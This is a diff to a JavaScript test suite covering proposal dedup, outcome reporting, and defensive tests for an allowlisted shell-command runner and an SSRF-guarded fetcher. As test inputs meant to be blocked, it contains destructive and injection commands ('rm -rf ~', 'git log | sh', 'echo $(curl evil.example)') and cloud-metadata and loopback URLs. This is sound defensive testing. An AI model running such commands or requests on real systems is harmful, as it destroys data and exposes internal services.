@@ -37,6 +37,7 @@ import {
   customSourceKey,
   fetchHttpSource,
   runShellCommand,
+  getTrustShellSources,
   normalizeIssueState,
   listForgeIssues,
   listBlockingIssues,
@@ -213,13 +214,13 @@ describe('isProposalDuplicate (dedup)', () => {
     expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: existing, now })).toBe(false);
   });
 
-  it('ALLOWS re-file for a checked PLAN item (closed with no closedAt — #2435)', () => {
-    // A `- [x]` PLAN item reads as closed with no timestamp; it must fall OUT of
-    // the dedup window so a completed proposal can be re-proposed, while an
-    // unchecked `- [ ]` item (state: 'open') stays suppressed.
+  it('SUPPRESSES a checked PLAN item (closed with no closedAt — #2620)', () => {
+    // A `- [x]` PLAN item reads as closed with no timestamp; it stays permanently
+    // within the dedup window — a completed proposal never needs re-proposal —
+    // and an unchecked `- [ ]` item (state: 'open') stays suppressed too.
     const closed = [{ slug: 'add-metrics', state: 'closed' }];
     const open = [{ slug: 'add-metrics', state: 'open' }];
-    expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: closed, now })).toBe(false);
+    expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: closed, now })).toBe(true);
     expect(isProposalDuplicate({ slug: 'add-metrics', existingIssues: open, now })).toBe(true);
   });
 
@@ -516,9 +517,19 @@ describe('deriveOutcome', () => {
     expect(deriveOutcome({ state: 'closed', stateReason: 'not planned' })).toBe('rejected');
   });
 
-  it('maps any other closed reason (incl. glab/jira with no reason) to merged', () => {
+  it('maps closed-completed (and reason-less closes from glab/jira/plan) to merged', () => {
     expect(deriveOutcome({ state: 'closed', stateReason: 'completed' })).toBe('merged');
+    // Graceful fallback: trackers that report no stateReason keep the current
+    // merged behavior — their common close path IS a merge (#2620).
     expect(deriveOutcome({ state: 'closed' })).toBe('merged');
+    expect(deriveOutcome({ state: 'closed', stateReason: null })).toBe('merged');
+    expect(deriveOutcome({ state: 'closed', stateReason: '' })).toBe('merged');
+  });
+
+  it('maps a close with any OTHER present reason to abandoned (#2620)', () => {
+    expect(deriveOutcome({ state: 'closed', stateReason: 'duplicate' })).toBe('abandoned');
+    expect(deriveOutcome({ state: 'closed', stateReason: 'stale' })).toBe('abandoned');
+    expect(deriveOutcome({ state: 'closed', stateReason: 'reopened' })).toBe('abandoned');
   });
 });
 
@@ -543,6 +554,20 @@ describe('computeOutcomesReport', () => {
     expect(report).toContain('app-data-gap: 2 filed, 2 merged (100%)');
     expect(report).toContain('app-improvement: 2 filed, 0 merged (0%)');
     expect(report).toContain('Common rejection reasons: too complex');
+  });
+
+  it('reports abandoned distinctly and excludes it from the merged numerator (#2620)', () => {
+    const outcomes = [
+      { scope: 'app-improvement', outcome: 'merged' },
+      { scope: 'app-improvement', outcome: 'abandoned' },
+      { scope: 'app-improvement', outcome: 'abandoned' },
+      { scope: 'app-improvement', outcome: 'rejected', outcomeReason: 'dup' }
+    ];
+    const report = computeOutcomesReport({ outcomes });
+    expect(report).toContain('Abandoned: 2 (50%)');
+    expect(report).toContain('Merged/implemented: 1 (25%)');
+    // Per-scope merge rate: abandoned counts in filed, never in merged.
+    expect(report).toContain('app-improvement: 4 filed, 1 merged (25%)');
   });
 
   it('exposes the recognized outcome set', () => {
@@ -575,7 +600,7 @@ describe('extractPlanSlugs', () => {
 
   it('treats a bare tag with no checkbox as open (absent ≠ done)', () => {
     // A tag mentioned inline, with no list checkbox, must NOT collapse to closed
-    // (which would make it re-proposable) — it stays open/suppressed.
+    // (which would mark it completed in the outcome loop) — it stays open.
     expect(extractPlanSlugs('see [lil-inline-ref] elsewhere')).toEqual([
       { slug: 'inline-ref', state: 'open' }
     ]);
@@ -700,6 +725,27 @@ describe('gatherSources custom file confinement', () => {
     );
     expect(out['custom:link.md']).toBe('INSIDE');
   });
+
+  it('drops a non-allowlisted custom cmd source when shell trust is off (#2515)', async () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    const out = await gatherSources(
+      { repoPath: dir },
+      { sources: { custom: [{ type: 'cmd', cmd: 'rm -rf /tmp/x' }] } },
+      { trustShellSources: false } // injected so no settings.json read
+    );
+    expect(Object.keys(out).some(k => k.startsWith('custom:cmd:'))).toBe(false);
+    warn.mockRestore();
+  });
+
+  it('runs an allowlisted custom cmd source and captures stdout (#2515)', async () => {
+    // Real allowlisted `echo` through the shell:false runner — deterministic.
+    const out = await gatherSources(
+      { repoPath: dir },
+      { sources: { custom: [{ type: 'cmd', cmd: 'echo hello-source' }] } },
+      { trustShellSources: false }
+    );
+    expect(out['custom:cmd:echo hello-source']).toBe('hello-source');
+  });
 });
 
 describe('gatherSources appMetrics (METRICS.md)', () => {
@@ -740,43 +786,99 @@ describe('customSourceKey', () => {
 
 describe('fetchHttpSource', () => {
   it('returns body text on a 2xx http(s) response', async () => {
-    const fetchImpl = vi.fn().mockResolvedValue({ ok: true, text: async () => 'remote body' });
-    expect(await fetchHttpSource('https://example.com/x', { fetchImpl })).toBe('remote body');
+    const fetchText = vi.fn().mockResolvedValue('remote body');
+    expect(await fetchHttpSource('https://example.com/x', { fetchText })).toBe('remote body');
+    // Routed through the SSRF-guarded fetcher, failing soft (no thrown 400).
+    expect(fetchText).toHaveBeenCalledWith('https://example.com/x', expect.objectContaining({ throwOnUnsafe: false }));
   });
-  it('rejects a non-http scheme without calling fetch', async () => {
-    const fetchImpl = vi.fn();
-    expect(await fetchHttpSource('file:///etc/hosts', { fetchImpl })).toBeNull();
-    expect(fetchImpl).not.toHaveBeenCalled();
+  it('rejects a non-http scheme without calling the fetcher', async () => {
+    const fetchText = vi.fn();
+    expect(await fetchHttpSource('file:///etc/hosts', { fetchText })).toBeNull();
+    expect(fetchText).not.toHaveBeenCalled();
   });
-  it('returns null on a non-ok response', async () => {
-    const fetchImpl = vi.fn().mockResolvedValue({ ok: false, text: async () => 'nope' });
-    expect(await fetchHttpSource('https://example.com/x', { fetchImpl })).toBeNull();
+  it('returns null when the fetcher yields null (non-ok / dead URL)', async () => {
+    const fetchText = vi.fn().mockResolvedValue(null);
+    expect(await fetchHttpSource('https://example.com/x', { fetchText })).toBeNull();
   });
-  it('returns null when fetch throws (dead URL / timeout)', async () => {
-    const fetchImpl = vi.fn().mockRejectedValue(new Error('boom'));
-    expect(await fetchHttpSource('https://example.com/x', { fetchImpl })).toBeNull();
+  it('returns null when the fetcher throws (timeout)', async () => {
+    const fetchText = vi.fn().mockRejectedValue(new Error('boom'));
+    expect(await fetchHttpSource('https://example.com/x', { fetchText })).toBeNull();
+  });
+
+  // SSRF: exercise the REAL fetchPublicText guard (default injected). IP-literal
+  // hosts are classified synchronously — no network — so these are deterministic.
+  it('blocks the cloud-metadata endpoint (169.254.169.254) — omits the key, no network', async () => {
+    expect(await fetchHttpSource('http://169.254.169.254/latest/meta-data/')).toBeNull();
+  });
+  it('blocks IPv4 loopback (127.0.0.1)', async () => {
+    expect(await fetchHttpSource('http://127.0.0.1:5555/api/settings')).toBeNull();
+  });
+  it('blocks IPv6 loopback ([::1])', async () => {
+    expect(await fetchHttpSource('http://[::1]/')).toBeNull();
+  });
+  it('blocks named cloud-metadata endpoints inside allowed private ranges (Alibaba/AWS IMDS)', async () => {
+    expect(await fetchHttpSource('http://100.100.100.200/latest/meta-data/')).toBeNull();
+    expect(await fetchHttpSource('http://[fd00:ec2::254]/latest/meta-data/')).toBeNull();
+  });
+  it('allows a public URL through the guard (real fetch stubbed at fetchText seam)', async () => {
+    const fetchText = vi.fn().mockResolvedValue('public body');
+    expect(await fetchHttpSource('https://example.com/feed', { fetchText })).toBe('public body');
   });
 });
 
-describe('runShellCommand', () => {
-  it('returns trimmed stdout on exit 0, running through the shell in cwd', async () => {
+describe('runShellCommand (restricted by default — #2515)', () => {
+  it('runs an allowlisted command with parsed args and shell:false, returns trimmed stdout', async () => {
     const exec = vi.fn().mockResolvedValue({ code: 0, stdout: '  out\n', stderr: '' });
-    expect(await runShellCommand('echo out', { cwd: '/x', exec })).toBe('out');
-    // bufferedSpawn signature: (cmd, args, { cwd, timeoutMs, shell })
-    expect(exec).toHaveBeenCalledWith('echo out', [], expect.objectContaining({ cwd: '/x', shell: true }));
+    expect(await runShellCommand('git log --oneline', { cwd: '/x', exec })).toBe('out');
+    // Parsed to base binary + args, spawned WITHOUT a shell (no string interpretation).
+    expect(exec).toHaveBeenCalledWith('git', ['log', '--oneline'], expect.objectContaining({ cwd: '/x', shell: false }));
   });
-  it('returns null on non-zero exit', async () => {
+  it('returns null on non-zero exit (allowlisted binary)', async () => {
     const exec = vi.fn().mockResolvedValue({ code: 1, stdout: 'partial', stderr: 'err' });
-    expect(await runShellCommand('false', { cwd: '/x', exec })).toBeNull();
+    expect(await runShellCommand('git status', { cwd: '/x', exec })).toBeNull();
   });
   it('returns null on a timed-out command (code -1)', async () => {
     const exec = vi.fn().mockResolvedValue({ code: -1, stdout: '', stderr: '', timedOut: true });
-    expect(await runShellCommand('sleep 999', { cwd: '/x', exec })).toBeNull();
+    expect(await runShellCommand('cat big', { cwd: '/x', exec })).toBeNull();
   });
   it('returns null on empty command without invoking exec', async () => {
     const exec = vi.fn();
     expect(await runShellCommand('   ', { cwd: '/x', exec })).toBeNull();
     expect(exec).not.toHaveBeenCalled();
+  });
+  it('rejects a non-allowlisted binary without spawning', async () => {
+    const exec = vi.fn();
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    expect(await runShellCommand('rm -rf /tmp/x', { cwd: '/x', exec })).toBeNull();
+    expect(exec).not.toHaveBeenCalled();
+    expect(warn).toHaveBeenCalled();
+    warn.mockRestore();
+  });
+  it('rejects a command with shell metacharacters (injection) without spawning', async () => {
+    const exec = vi.fn();
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    // Even though `git` is allowlisted, the `;`/`|`/`$()` chaining is denied.
+    expect(await runShellCommand('git log; rm -rf ~', { cwd: '/x', exec })).toBeNull();
+    expect(await runShellCommand('git log | sh', { cwd: '/x', exec })).toBeNull();
+    expect(await runShellCommand('echo $(curl evil.example)', { cwd: '/x', exec })).toBeNull();
+    expect(exec).not.toHaveBeenCalled();
+    warn.mockRestore();
+  });
+  it('escape hatch: trustShellSources restores full shell:true execution', async () => {
+    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: 'piped\n', stderr: '' });
+    expect(await runShellCommand('git log --oneline | head', { cwd: '/x', exec, trustShellSources: true })).toBe('piped');
+    // Full string handed to the shell verbatim (opt-in only).
+    expect(exec).toHaveBeenCalledWith('git log --oneline | head', [], expect.objectContaining({ cwd: '/x', shell: true }));
+  });
+});
+
+describe('getTrustShellSources (install-level opt-in — #2515)', () => {
+  it('only an explicit true unlocks the shell', async () => {
+    expect(await getTrustShellSources(async () => ({ layeredIntelligence: { trustShellSources: true } }))).toBe(true);
+    expect(await getTrustShellSources(async () => ({ layeredIntelligence: { trustShellSources: false } }))).toBe(false);
+    expect(await getTrustShellSources(async () => ({ layeredIntelligence: {} }))).toBe(false);
+    expect(await getTrustShellSources(async () => ({}))).toBe(false);
+    expect(await getTrustShellSources(async () => ({ layeredIntelligence: { trustShellSources: 'yes' } }))).toBe(false);
   });
 });
 
@@ -995,8 +1097,12 @@ describe('semantic dedup — pure helpers', () => {
       expect(isIssueWithinDedupWindow({ state: 'closed', closedAt: recent }, NOW)).toBe(true);
       expect(isIssueWithinDedupWindow({ state: 'closed', closedAt: old }, NOW)).toBe(false);
     });
-    it('closed with unknown close time falls out of window', () => {
-      expect(isIssueWithinDedupWindow({ state: 'closed' }, NOW)).toBe(false);
+    it('closed with missing/unparseable close time stays permanently in-window (#2620)', () => {
+      // Closed-without-closedAt (a checked `- [x]` PLAN item, or a tracker row
+      // missing its close time) is completed work — it must stay suppressed,
+      // not become re-proposable.
+      expect(isIssueWithinDedupWindow({ state: 'closed' }, NOW)).toBe(true);
+      expect(isIssueWithinDedupWindow({ state: 'closed', closedAt: 'not-a-date' }, NOW)).toBe(true);
     });
     it('agrees with isProposalDuplicate on the window boundary', () => {
       const old = new Date(NOW - (CLOSED_SUPPRESSION_MS + 1000)).toISOString();
